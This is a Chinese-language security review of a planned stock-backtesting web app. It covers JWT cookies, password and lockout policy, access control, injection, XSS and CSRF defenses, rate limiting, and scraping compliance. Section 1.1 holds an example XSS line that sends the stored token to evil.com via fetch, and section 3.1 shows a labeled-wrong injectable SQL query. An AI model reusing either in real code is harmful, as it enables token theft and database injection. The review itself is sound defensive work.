# 慢富(SlowRich) 安全评审报告

> 评审人：代码评审官 | 日期：2026-05-17 | 版本：v1.0

---

## 1. 认证安全

### 1.1 JWT方案评审

| 评估项 | 当前设计 | 风险等级 | 评审结论 |
|--------|----------|----------|----------|
| Token存储 | localStorage | 🔴 Critical | XSS攻击可窃取Token |
| Token有效期 | 7天 | 🟡 Medium | 过长，建议缩短 |
| Refresh机制 | 无 | 🟡 Medium | 用户体验差，无安全吊销能力 |
| Token签名算法 | 未指定 | 🟡 Medium | 需明确为HS256或RS256 |
| Token载荷 | 含user.id, email, role | 🟢 Low | 合理，但role变更需等Token过期才生效 |

#### 🔴 Critical: localStorage → HttpOnly Cookie 改造方案

**当前风险：**
```javascript
// 攻击者通过XSS注入可获取Token
<script>
  fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))
</script>
```

**改造方案：**

```
登录流程改造：
1. POST /api/auth/login
2. 服务端验证成功后：
   - 生成AccessToken (JWT, 30min有效期)
   - 生成RefreshToken (随机字符串, 7天有效期, 存D1)
   - 设置Cookie:
     Set-Cookie: access_token={jwt}; HttpOnly; Secure; SameSite=Strict; Path=/api; Max-Age=1800
     Set-Cookie: refresh_token={random}; HttpOnly; Secure; SameSite=Strict; Path=/api/auth/refresh; Max-Age=604800
3. 前端无需手动存储Token，浏览器自动携带Cookie

Token刷新流程：
1. AccessToken过期 → API返回401 (code: 20002)
2. 前端自动调用 POST /api/auth/refresh (浏览器自动携带refresh_token Cookie)
3. 服务端验证RefreshToken → 签发新AccessToken → 设置新Cookie
4. 刷新成功 → 重试原请求
5. RefreshToken也过期 → 跳转登录页

登出流程：
1. POST /api/auth/logout
2. 服务端删除D1中的RefreshToken记录
3. 清除Cookie: Set-Cookie: access_token=; Max-Age=0; ... 
```

**Cookie属性说明：**

| 属性 | 值 | 说明 |
|------|-----|------|
| HttpOnly | ✅ | JavaScript无法访问，防XSS |
| Secure | ✅ | 仅HTTPS传输，防中间人 |
| SameSite | Strict | 防CSRF（同站点才发送Cookie） |
| Path | /api | 限制Cookie发送范围 |

### 1.2 密码安全

| 评估项 | 当前设计 | 风险等级 | 改进建议 |
|--------|----------|----------|----------|
| 哈希算法 | bcrypt | ✅ 合格 | - |
| 默认管理员密码 | 666666 | 🔴 Critical | 见下方方案 |
| 密码长度 | 6-20位 | 🟡 Medium | 建议最少8位 |
| 密码复杂度 | 无要求 | 🟡 Medium | 建议要求含字母+数字 |
| 登录失败限制 | 无 | 🔴 Critical | 见下方方案 |

#### 🔴 Critical: 默认管理员弱密码改造方案

**方案：首次登录强制修改密码**

```
实现步骤：
1. users表增加 must_change_password 字段（默认0，管理员初始为1）
2. 初始管理员 INSERT: must_change_password = 1
3. 登录时检查 must_change_password：
   - = 0: 正常登录，返回Token
   - = 1: 返回特殊响应 {code: 20006, message: "请修改初始密码", data: {must_change_password: true, temp_token: "..."}}
4. 临时Token仅允许调用 PUT /api/auth/password
5. 修改密码成功后 must_change_password = 0，返回正常Token

API新增：
PUT /api/auth/password
{
  "old_password": "666666",
  "new_password": "NewSecureP@ss123"
}
校验：
- 旧密码正确
- 新密码≠旧密码
- 新密码长度≥8，含字母+数字
- 更新password_hash，must_change_password=0
```

#### 🔴 Critical: 登录暴力破解防护

```
实现方案：
1. users表增加字段：
   - login_fail_count INTEGER DEFAULT 0  -- 连续失败次数
   - locked_until TEXT                   -- 锁定截止时间

2. 登录逻辑：
   - 检查locked_until，若未过期则拒绝登录，返回"账号已锁定，请X分钟后重试"
   - 密码错误：login_fail_count += 1
   - 连续5次失败：锁定30分钟 (locked_until = now + 30min)
   - 登录成功：login_fail_count = 0, locked_until = null

3. IP级别限制（Workers层）：
   - 使用Cloudflare Rate Limiting规则
   - 同一IP: 5次登录请求/分钟
   - 超限返回429 Too Many Requests
```

---

## 2. 权限控制安全

### 2.1 角色权限矩阵

| 资源/操作 | admin | user | 未登录 |
|-----------|-------|------|--------|
| POST /api/auth/register | - | - | ✅ |
| POST /api/auth/login | - | - | ✅ |
| GET /api/stocks | ✅ | ✅ (只读) | ❌ |
| POST /api/stocks | ✅ | ❌ | ❌ |
| PUT /api/stocks/:id | ✅ | ❌ | ❌ |
| DELETE /api/stocks/:id | ✅ | ❌ | ❌ |
| POST /api/download/tasks | ✅ | ✅ | ❌ |
| POST /api/backtest | ✅ | ✅ | ❌ |
| POST /api/market/temperature/fetch | ✅ | ❌ | ❌ |

### 2.2 权限校验实现建议

```typescript
// Hono中间件示例
const authMiddleware = async (c, next) => {
  const token = getTokenFromCookie(c); // 从Cookie获取
  if (!token) return c.json({code: 20001, message: "未登录"}, 401);
  
  const payload = verifyJWT(token);
  if (!payload) return c.json({code: 20002, message: "Token已过期"}, 401);
  
  c.set('user', payload);
  await next();
};

const adminMiddleware = async (c, next) => {
  const user = c.get('user');
  if (user.role !== 'admin') {
    return c.json({code: 20003, message: "权限不足"}, 403);
  }
  await next();
};

// 路由使用
app.post('/api/stocks', authMiddleware, adminMiddleware, createStock);
app.get('/api/stocks', authMiddleware, listStocks);
```

### 2.3 权限风险

| 风险 | 说明 | 建议 |
|------|------|------|
| 越权访问 | 用户A可否访问用户B的回测结果？ | 回测查询需校验user_id（admin可查看所有） |
| 水平越权 | 修改/删除股票时是否校验ID存在+权限？ | 所有写操作必须同时校验权限和资源存在性 |
| Token角色篡改 | JWT中role字段被伪造？ | 使用服务端密钥签名，前端无法篡改 |
| 管理员操作审计 | 管理员操作无记录 | 建议增加admin_logs表记录关键操作 |

---

## 3. 输入校验与注入防护

### 3.1 SQL注入防护

**D1参数化查询**（Workers + D1天然支持参数化）：

```typescript
// ✅ 正确：参数化查询
const result = await db.prepare(
  'SELECT * FROM stocks WHERE code = ? AND market = ?'
).bind(code, market).all();

// ❌ 错误：字符串拼接
const result = await db.prepare(
  `SELECT * FROM stocks WHERE code = '${code}'`
).all();
```

**建议：** 在代码规范中明确要求所有D1查询必须使用参数化，禁止字符串拼接SQL。

### 3.2 XSS防护

| 攻击面 | 防护措施 | 评价 |
|--------|----------|------|
| 反射型XSS | React默认转义 + CSP | ✅ React JSX自动转义 |
| 存储型XSS | 输入过滤 + 输出转义 | ⚠️ 股票名称等用户输入需过滤 |
| DOM型XSS | 避免dangerouslySetInnerHTML | ⚠️ 需在代码规范中禁止 |

**建议增加CSP头：**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' https://api.tushare.pro
```

### 3.3 CSRF防护

**当前风险：** 改用HttpOnly Cookie后引入CSRF风险。

**防护方案：SameSite=Strict Cookie**

SameSite=Strict属性已提供强CSRF防护（跨站请求不发送Cookie）。但Strict模式会阻止从外链进入时的Cookie携带，影响用户体验。

**推荐方案：SameSite=Lax + CSRF Token（双重防护）**

```
1. Cookie设置: SameSite=Lax（允许顶级导航携带Cookie）
2. 关键写操作（POST/PUT/DELETE）增加CSRF Token校验：
   - 登录时在Cookie中设置csrf_token（随机值）
   - 前端从Cookie读取csrf_token，放入请求Header: X-CSRF-Token
   - 服务端比对Cookie中的csrf_token与Header中的值
3. GET请求不修改数据，无需CSRF Token
```

---

## 4. 数据安全

### 4.1 敏感数据处理

| 数据类型 | 存储方式 | 传输方式 | 评价 |
|----------|----------|----------|------|
| 密码 | bcrypt哈希 | HTTPS加密 | ✅ 合格 |
| Token | Cookie (HttpOnly) | HTTPS加密 | ✅ 改造后合格 |
| 邮箱 | 明文 | HTTPS加密 | ⚠️ 可考虑脱敏展示 |
| 行情数据 | 明文 | HTTPS加密 | ✅ 公开数据，无安全风险 |
| Tushare Token | 需存储 | - | ⚠️ 需加密存储 |

**Tushare Token安全存储：**
```typescript
// 使用Workers环境变量存储Tushare Token
// wrangler.toml中配置（不提交到Git）
[vars]
TUSHARE_TOKEN = "xxx"  # 敏感值用 wrangler secret put

// 或使用Secrets（推荐）
// wrangler secret put TUSHARE_TOKEN
// 代码中通过 env.TUSHARE_TOKEN 访问
```

### 4.2 数据备份

| 评估项 | 当前设计 | 建议 |
|--------|----------|------|
| D1备份 | Cloudflare自动快照 | ✅ D1提供point-in-time恢复 |
| 数据导出 | 无 | 建议增加管理员数据导出功能 |
| 灾难恢复 | 依赖Cloudflare | 建议定期导出SQL到外部存储 |

---

## 5. 网络安全

### 5.1 HTTPS配置

- Cloudflare Pages和Workers默认启用HTTPS ✅
- 建议启用HSTS：`Strict-Transport-Security: max-age=31536000; includeSubDomains`

### 5.2 CORS配置

```typescript
// Hono CORS配置
app.use('/api/*', cors({
  origin: ['https://slowerich.pages.dev'], // 仅允许前端域名
  allowMethods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
  credentials: true, // 允许携带Cookie
  maxAge: 86400,
}));
```

### 5.3 速率限制

```
Cloudflare Rate Limiting规则建议：

1. 登录接口保护：
   - 匹配: POST /api/auth/login
   - 阈值: 5次/分钟/IP
   - 动作: 阻断429

2. 注册接口保护：
   - 匹配: POST /api/auth/register
   - 阈值: 3次/小时/IP
   - 动作: 阻断429

3. 回测接口保护：
   - 匹配: POST /api/backtest
   - 阈值: 3次/分钟/用户
   - 动作: 阻断429

4. 通用API保护：
   - 匹配: /api/*
   - 阈值: 60次/分钟/IP
   - 动作: 阻断429
```

---

## 6. 爬虫合规性评审（集思录）

### 6.1 法律风险评估

| 评估项 | 分析 |
|--------|------|
| robots.txt | 需检查 https://www.jisilu.cn/robots.txt 是否允许爬取 |
| 服务条款 | 需审查集思录用户协议，是否禁止数据抓取 |
| 数据版权 | 市场温度数据可能受版权保护 |
| 频率影响 | 每10s一次请求对集思录服务器的影响极小 |
| 商业使用 | 将抓取数据用于商业服务可能违反服务条款 |

### 6.2 替代方案评估

| 方案 | 可行性 | 成本 | 合规性 |
|------|--------|------|--------|
| A: 用户手动输入温度值 | ✅ 可行 | 免费 | ✅ 完全合规 |
| B: 集思录官方API（如有） | ❌ 未知 | 未知 | ✅ 合规 |
| C: 自行计算市场温度 | ✅ 可行 | 免费 | ✅ 合规 |
| D: 当前爬虫方案（优化后） | ⚠️ 有风险 | 免费 | ⚠️ 需确认 |

**🏆 推荐方案C：自行计算市场温度**

市场温度本质上是全市场PE/PB百分位指标，可基于已有行情数据计算：

```
计算逻辑：
1. 获取全A股当日PE/PB数据（可从东方财富免费获取）
2. 计算当前PE/PB在历史N年中的百分位
3. 百分位值即为"市场温度"（0-100）
4. 温度等级：
   - 0-20: 极冷（低估区）
   - 20-40: 冷
   - 40-60: 适中
   - 60-80: 热
   - 80-100: 极热（高估区）
```

**优势：**
- 无合规风险
- 数据源可控（东方财富HTTP API）
- 可自定义温度算法
- 与项目已有的数据下载引擎集成

### 6.3 如果保留爬虫方案的合规建议

1. 先检查并遵守robots.txt
2. 设置User-Agent标明身份
3. 请求间隔≥10秒
4. 仅抓取公开展示的数据
5. 在隐私政策中声明数据来源
6. 做好随时切换到自计算方案的准备

---

## 7. 安全改进清单

### P0 - 开发前必须完成

| # | 改进项 | 详细方案 | 参考章节 |
|---|--------|----------|----------|
| SEC-01 | JWT存储改为HttpOnly Cookie | 见1.1节 | 1.1 |
| SEC-02 | 默认管理员强制修改密码 | 见1.2节 | 1.2 |
| SEC-03 | 登录暴力破解防护 | 见1.2节 | 1.2 |

### P1 - 第一阶段完成

| # | 改进项 | 详细方案 | 参考章节 |
|---|--------|----------|----------|
| SEC-04 | Refresh Token机制 | 见1.1节 | 1.1 |
| SEC-05 | CSRF防护 | 见3.3节 | 3.3 |
| SEC-06 | Rate Limiting | 见5.3节 | 5.3 |
| SEC-07 | CORS白名单 | 见5.2节 | 5.2 |
| SEC-08 | 密码复杂度要求 | ≥8位，含字母+数字 | 1.2 |
| SEC-09 | CSP头 | 见3.2节 | 3.2 |
| SEC-10 | HSTS | 见5.1节 | 5.1 |

### P2 - 后续迭代

| # | 改进项 | 详细方案 | 参考章节 |
|---|--------|----------|----------|
| SEC-11 | 集思录爬虫合规或替换 | 见6.2节 | 6.2 |
| SEC-12 | 管理员操作审计日志 | 见2.3节 | 2.3 |
| SEC-13 | 数据导出备份 | 见4.2节 | 4.2 |
| SEC-14 | 邮箱脱敏展示 | u***@example.com | 4.1 |

---

*安全评审报告结束。配套文档：[架构评审报告](./architecture-review.md)、[风险登记表](./risk-register.md)*
